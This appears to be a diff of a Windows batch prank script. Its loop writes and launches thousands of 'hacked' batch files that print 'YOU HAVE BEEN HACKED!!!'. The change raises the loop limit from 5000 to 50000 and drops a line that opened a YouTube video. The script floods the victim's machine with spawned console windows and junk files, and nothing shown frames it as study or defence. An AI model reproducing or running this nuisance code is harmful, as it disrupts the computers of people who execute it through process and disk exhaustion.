@@ -48,7 +48,7 @@ goto loop
 
 :loop
 cls
-if "%number%" == "5000" goto endcheck
+if "%number%" == "50000" goto endcheck
 color 0C
 echo @echo off>>hacked%number%.bat
 echo title HACKED>>hacked%number%.bat
@@ -57,7 +57,6 @@ echo echo YOU HAVE BEEN HACKED!!! LOLOLOL>>hacked%number%.bat
 title yOU haVE BEEN HACKED!!!
 start "%~dp0\hacked%number%.bat"
 set /a number=%number% + 1
-start "" "https://www.youtube.com/watch?v=ZPN6fSNXHXw"
 goto loop
 
 
